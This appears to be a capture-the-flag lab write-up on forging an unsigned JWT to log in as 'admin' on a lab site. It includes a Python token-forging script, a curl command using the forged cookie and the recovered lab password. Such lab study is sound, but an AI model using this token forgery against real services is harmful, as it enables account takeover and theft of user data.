# Accountsphere - JWT Vulnerability Writeup

## Information

- **URL**: <http://accountsphere.hv>
- **IP**: 172.20.24.60
- **Vulnerability**: JWT Algorithm Confusion (None Algorithm)

## Objective

Log in as the "admin" user by forging a JWT token and retrieve the password.

## Steps

1. **Reconnaissance**
    - Accessed `http://accountsphere.hv/login.php`.
    - Found default credentials `user:user` displayed on the login page.
    - Logged in with `user:user` and examined the cookies. A `jwt` cookie was set.

2. **Vulnerability Analysis**
    - Decoded the JWT header: `{"typ":"JWT","alg":"none"}`. The algorithm is set to `none`, meaning the signature verification is disabled.
    - Decoded the JWT payload: `{"iat":...,"exp":...,"sub":2}`. The `sub` field likely represents the user ID.

3. **Exploitation**
    - Modified the `sub` value from `2` (user) to `1` (admin) in the payload.
    - Kept the algorithm as `none`.
    - Removed the signature part (everything after the second dot).
    - Crafted the new JWT token using Python script.

    ```python
    import base64
    import json
    import time

    header = b'{"typ":"JWT","alg":"none"}'
    payload = json.dumps({'iat': int(time.time()), 'exp': int(time.time()) + 3600, 'sub': 1}).encode()
    print((base64.urlsafe_b64encode(header).decode().rstrip('=') + '.' + base64.urlsafe_b64encode(payload).decode().rstrip('=') + '.').strip())
    ```

    - Used the forged token to access the protected page `index.php`.

    ```bash
    curl -b "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpYXQiOjE3NzEwNjE2NjIsImV4cCI6MTc3MTA2NTI2Miwic3ViIjoxfQ." http://accountsphere.hv/index.php
    ```

4. **Data Extraction**
    - The server accepted the forged token and logged me in as `admin`.
    - Inspected the HTML source code of the profile page.
    - Found the password in an input field: `value="CtB4mfe4zZPLNe"`.

## Result

The seen password for the "admin" account is: **CtB4mfe4zZPLNe**
